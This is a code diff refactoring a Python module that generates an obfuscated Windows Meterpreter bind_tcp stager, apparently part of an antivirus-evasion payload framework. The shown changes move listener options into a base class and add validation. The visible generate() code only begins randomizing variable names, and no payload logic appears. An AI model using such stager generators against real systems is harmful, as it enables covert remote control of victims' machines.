@@ -2,31 +2,28 @@
 
 Custom-written pure python meterpreter/bind_tcp stager.
 
-By @mimix
-
 """
 
 from modules.common import helpers
 from modules.common import encryption
+from modules.common.pythonpayload import PythonPayload
 
-class Payload:
+class Payload(PythonPayload):
     
     def __init__(self):
+        PythonPayload.__init__(self)
         # required options
         self.description = "pure windows/meterpreter/bind_tcp stager, no shellcode"
-        self.language = "python"
         self.rating = "Excellent"
-        self.extension = "py"
         
         # optional
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "LHOST" : ["", "The target address"],
-                                 "LPORT" : ["4444", "The listen port"]}
+        self.required_options["LHOST"] = ["0.0.0.0", "The target address"]
+        self.required_options["LPORT"] = ["4444", "The listen port"]
         
         
     def generate(self):
+        self._validateArchitecture()
         
         # randomize all of the variable names used
         shellCodeName = helpers.randomString()
